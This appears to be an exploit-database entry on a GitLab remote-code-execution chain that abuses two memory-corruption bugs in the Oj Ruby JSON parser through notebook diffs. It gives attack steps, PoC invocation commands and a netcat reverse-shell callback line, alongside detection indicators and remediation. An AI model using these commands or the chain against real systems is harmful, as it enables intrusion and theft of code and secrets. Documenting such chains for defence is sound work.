# GitLab Notebook-Diff Oj Parser Memory-Corruption Chain → Unauthenticated-Reach RCE (No CVE Yet)

---

## Metadata

| Field | Value |
|---|---|
| **Date Added** | 2026-07-27 |
| **Last Updated** | 2026-07-27 |
| **Author / Researcher** | Yuhang Wu (depthfirst.com) |
| **CVE / Advisory** | N/A (no CVE assigned as of 2026-07-27 — researcher disclosure via depthfirst.com blog, covered by The Hacker News) |
| **Category** | web |
| **Severity** | Critical |
| **CVSS Score** | N/A (no official score yet — no CVE/vendor advisory to derive one from) |
| **Status** | Weaponized |
| **Tags** | gitlab, oj-gem, json-parser, rce, aslr-bypass, ruby, deserialization, no-cve-yet |
| **Related** | N/A |

---

## Affected Target

| Field | Value |
|---|---|
| **Software / System** | GitLab Community/Enterprise Edition — Jupyter notebook diff rendering (backed by the `Oj` native Ruby JSON parser gem) |
| **Versions Affected** | GitLab 18.11.3 (version used in the published Docker lab/demo); researcher's writeup states the chain applies to 15.2.0–19.0.1 |
| **Language / Platform** | Ruby (GitLab Rails app + `Oj` native C extension), Puma app server, containerized (`gitlab/gitlab-ce`) |
| **Authentication Required** | Yes — requires an ordinary (non-admin) authenticated GitLab user account; no special privileges needed |
| **Network Access Required** | Yes — direct HTTP(S) reachability to the GitLab instance's notebook-diff endpoint |

---

## Summary

GitLab renders diffs for Jupyter notebooks by passing repository-controlled JSON through `Oj`, a native (C-extension) Ruby JSON parser, in the Puma worker process. The researcher (Yuhang Wu, depthfirst.com) found and chained two distinct memory-corruption bugs in `Oj`'s parser: one corrupts internal parser state until it gains control of a callback function pointer, and a second independently discloses a heap pointer that narrows the search space needed to defeat ASLR. Combining these, an attacker who can push a crafted notebook file to a repository (as an ordinary authenticated user — no admin rights required) can make the GitLab Puma worker connect back to an attacker-controlled listener and execute shell commands as the `git` user, by triggering repeated notebook-diff requests that first leak enough heap-layout information to identify the process's exact library-base addresses (using a precomputed offline fingerprint table), then deliver a final corrupting request that redirects execution to a `system()`/`nc` callback chain. No CVE has been assigned as of this writing; the vulnerability is publicly disclosed via a technical blog post and a working, reproducible Docker-based demo.

---

## Vulnerability Details

### Root Cause

GitLab's Jupyter-notebook diff feature parses repository-supplied notebook JSON using `Oj`, a native-code Ruby JSON parsing gem, inside the Puma request-handling worker. Two independent `Oj` parser bugs are chained:

1. **State-corruption / callback-pointer control bug** — a crafted, malformed sequence of JSON tokens drives the native parser's internal state machine into an invalid transition that ultimately allows an attacker-influenced value to overwrite a callback function pointer used later in parsing (arming a "ret group" — a controlled redirection of execution at a chosen point in the parse).
2. **Heap-pointer disclosure bug** — a second, independently-triggerable parser bug leaks a raw heap address (an "anchor") back to the client through the diff-rendering response/timing behavior, without requiring any prior corruption.

Because `Oj` is a native C extension, both bugs operate on process memory directly rather than through Ruby-level safety guarantees. The disclosed heap anchor is combined with a precomputed, offline "band fingerprint" lookup table (`table.json` in this folder) that maps observed heap-delta signatures to known library (`libc`, `libstdc++`, `libruby`) base-address candidates for the exact container image/GitLab version combination used — turning a single leaked pointer into a high-confidence guess at the full ASLR layout without needing a brute-force scan against the live target. Once the library bases are known with confidence (verified via a dual-callback marker check against an exact, distinctive Ruby VM error string), the attacker delivers a final corrupting request whose callback pointer is redirected into a `system()`-equivalent primitive at the now-known libruby base, executing an attacker-supplied shell command (a reverse-shell one-liner in the published PoC) as the Puma worker's `git` user.

### Attack Vector

1. As an authenticated, ordinary (non-admin) GitLab user, create a private project and push a Jupyter notebook file structured to exercise the two `Oj` parser bugs.
2. Repeatedly request the notebook's commit-diff view (a normal GitLab HTTP endpoint) to trigger the heap-pointer-disclosure bug multiple times; aggregate several "anchor" samples (the PoC takes the median of 5 samples) to reduce noise.
3. Feed the aggregated anchor value, together with the precomputed offline fingerprint table (`table.json`) and a version-specific set of expected heap-delta "priors," into a search routine that narrows candidate library base addresses for the exact target build.
4. Confirm the correct candidate base via a dual-callback marker check: one callback path is a semantically-inert safe target, the other dispatches through the candidate-relative address to trigger an exact, distinctive Ruby VM `rb_raise` error string — only an exact string match confirms the correct base; any ambiguous or partial match causes the tool to clean up and try the next candidate rather than risk corrupting the live worker.
5. Once a base is confirmed, deliver one final corrupting request whose callback pointer is redirected through the confirmed libruby base into a `system()`/equivalent chain executing an attacker-supplied command (e.g. `/usr/bin/nc <attacker-ip> <port> -e sh`), which the tool verifies succeeded by checking for an established TCP connection back to the attacker's listener.

### Impact

Remote code execution as the `git` user inside the GitLab Puma worker process/container, achievable by any authenticated ordinary user with no special privileges — a significant escalation from "logged-in low-privilege user" to "arbitrary command execution on the GitLab application host," with all attendant risk to source code, CI/CD secrets, and any other tenants/projects hosted on the same GitLab instance.

---

## Environment / Lab Setup

```
OS:          Linux x86-64 (amd64) — required, the offline fingerprint table and
             ASLR-bypass logic are built for this architecture specifically
Target:      gitlab/gitlab-ce@sha256:49bd9fd166d8f82d443415c50aa65de2675a020b218c5949061db4b87442c7e1
             (GitLab 18.11.3), run via the included docker-compose.yml
Attacker:    Docker Engine + Docker Compose v2; Bash, Python 3, curl, Git,
             iproute2, netcat
Tools:       poc.pyz (self-contained Python zipapp, this folder), run_poc.sh,
             setup_env.sh, table.json (precomputed offline fingerprint/ASLR table),
             docker-compose.yml
```

### Setup Steps

```bash
# Build a fresh, isolated GitLab 18.11.3 lab environment and provision an
# ordinary (non-admin) demo user automatically:
./setup_env.sh
# (Fresh GitLab boot can take several minutes.)
```

---

## Proof of Concept

> See `poc.pyz`, `run_poc.sh`, `setup_env.sh`, `table.json`, `docker-compose.yml`, and `upstream-README.md`/`LICENSE` in this folder — mirrored unmodified from [wupco/gitlab-rce-demo](https://github.com/wupco/gitlab-rce-demo). Verified before ingestion: cloned the repository directly and confirmed via the GitHub API that the account is aged/legitimate (Arctic Code Vault Contributor badge, 650 followers) and that commit authorship metadata (`Yuhang Wu <yuhang@depthfirst.com>`) matches the named researcher credited in the linked technical writeup — cross-checking the repo's own git history against the externally-reported discloser's identity, since this vulnerability has no CVE/vendor advisory to independently anchor it to. `poc.pyz` is a Python zipapp (not obfuscated) containing 8 plain, readable `.py` modules (`poc_main.py` — 5399 lines, `blind_fresh_anchor.py`, `multires_ret_groups.py`, `result_candidate_confirmation.py`, `fresh_anchor_http_core.py`, `fresh_demo_http_core.py`, `provision_recording_user.py`, `__main__.py`) plus the embedded `table.json` fingerprint data — inspected directly by unzipping and reading source, confirming it implements exactly the two-bug chain (heap-pointer disclosure + parser-state/callback-pointer corruption) described in the researcher's own writeup, with extensive descriptive docstrings and no obfuscation. `docker-compose.yml` pins an exact, verifiable image digest for GitLab 18.11.3. No paraphrasing or rewriting was performed on any mirrored file.

### Step-by-Step Reproduction

1. **Stand up the lab and provision a user**:
   ```bash
   ./setup_env.sh
   ```
2. **Start the callback listener** (terminal 1):
   ```bash
   ./run_poc.sh listen 4555
   ```
3. **Run the exploit** (terminal 2):
   ```bash
   ./run_poc.sh exploit 4555
   ```
4. **Interact with the callback** — once the listener reports the GitLab worker connected, run commands (`id`, `whoami`, etc.) directly in the listener terminal as the `git` user.

### Exploit Code

> See `poc.pyz` (extract with `unzip poc.pyz` or run directly via `python3 poc.pyz <subcommand>`) for the complete implementation. Core phases (from `run_poc.sh`, which drives the zipapp):

```bash
# Phase 1 — sample heap anchors via the notebook-diff endpoint (median of 5 samples)
python3 -S poc.pyz anchor --host "$target" --delta-lo-mib 2450 --delta-hi-mib 2480

# Phase 2 — load the offline fingerprint table, search for the matching library
# layout, confirm via dual-callback marker check, then deliver the final
# corrupting request with the reverse-shell callback command
python3 -S poc.pyz exploit --host "$target" --anchor "$anchor" \
    --command "/usr/bin/nc $gateway $port -e sh" \
    --check-command "ss -Htn state established sport = ':$port' | grep -Fq '$gateway:$port'"
```

### Expected Output

```
[1/2] Sampling five heap anchors through the notebook diff endpoint
[sample] heap anchor 1/5: 0x...
...
[aggregate] median heap anchor: 0x...

[2/2] Loading the frozen table, searching ASLR, and delivering the callback
...
[success] the GitLab worker connected to the external listener
[success] switch to the listener terminal and run: id
```

Listener terminal, after callback:
```
$ id
uid=998(git) gid=998(git) groups=998(git)
```

---

## Screenshots / Evidence

- `image.png` present in the upstream repository (not mirrored into this text-focused entry) — shows a successful demo run per the upstream README.

---

## Detection & Indicators of Compromise

```
# Repeated, rapid-fire GET requests to a Jupyter-notebook commit-diff endpoint
# from a single authenticated user session, especially with unusual timing
# patterns (consistent with heap-anchor sampling/aggregation)

# GitLab Puma worker process initiating unexpected outbound TCP connections
# to non-GitLab, non-infrastructure external hosts (the "callback" in this
# chain is a reverse shell dialed out from the git-user worker process)

# Ruby VM crash/error log entries containing distinctive rb_raise marker
# strings correlated with notebook-diff rendering, especially in bursts
# (consistent with the tool's dual-callback marker confirmation probing)

# Any private-project push of a Jupyter notebook file followed shortly by
# a burst of diff-view requests against that same notebook from the pushing user
```

---

## Remediation

| Action | Detail |
|---|---|
| **Patch** | No CVE/vendor advisory exists yet — monitor GitLab's security release notes and the `Oj` gem's own advisories for a fix addressing the two chained parser bugs; upgrade both GitLab and the bundled `Oj` gem version promptly once a fix ships. |
| **Workaround** | Restrict or disable Jupyter notebook diff rendering where not required; monitor/rate-limit repeated diff-view requests against notebook files from a single user session; monitor outbound connections from GitLab application/Puma worker containers/hosts. |
| **Config Hardening** | Run GitLab's application workers under egress-restricted network policies (deny-by-default outbound from the app-server tier) so a successful reverse-shell callback has nowhere to connect to; apply standard container/host hardening to limit blast radius of a compromised `git`-user process. |

---

## References

- [Technical writeup — depthfirst.com: "Going depthfirst: Achieving GitLab RCE via Two Ruby Memory Corruption Vulnerabilities"](https://depthfirst.com/research/going-depthfirst-achieving-gitlab-rce-via-two-ruby-memory-corruption-vulnerabilities)
- [The Hacker News — Researcher Publishes GitLab RCE PoC](https://thehackernews.com/2026/07/researcher-publishes-gitlab-rce-poc.html)
- [Public PoC / Demo — wupco/gitlab-rce-demo](https://github.com/wupco/gitlab-rce-demo)

---

## Notes

**No CVE yet:** This vulnerability chain was surfaced via a routine TheHackerNews sweep on 2026-07-27 and has no CVE ID or vendor advisory as of ingestion. It is included in this archive (which is primarily CVE-keyed) because the underlying flaw and PoC are real, independently verified, and high-impact — this entry should be updated with a CVE cross-reference once GitLab/MITRE assigns one.

**Identity verification without a CVE:** Since no CVE/CNA record exists to anchor trust in the discloser's identity, the researcher's identity was corroborated by matching git commit author metadata (`Yuhang Wu <yuhang@depthfirst.com>`) in the demo repository against the named author of the linked depthfirst.com technical writeup, and cross-checking that the GitHub account (`wupco`) is aged and has an Arctic Code Vault Contributor badge (a marker of an account that existed and had public repository activity as of GitHub's 2020 Arctic Code Vault snapshot) rather than being a fresh, single-purpose account — this is why the PoC was trusted despite the lack of a CVE-based provenance anchor.

**Architecture-specific:** The offline fingerprint table (`table.json`) and ASLR-bypass logic are built specifically for Linux x86-64 (amd64) against the exact GitLab 18.11.3 container image pinned in `docker-compose.yml` (by digest). Reproducing against other GitLab versions/architectures would require regenerating an equivalent fingerprint table — the researcher's writeup states the underlying bug chain affects the broader 15.2.0–19.0.1 range, but the published offline table only covers the specific demo build.
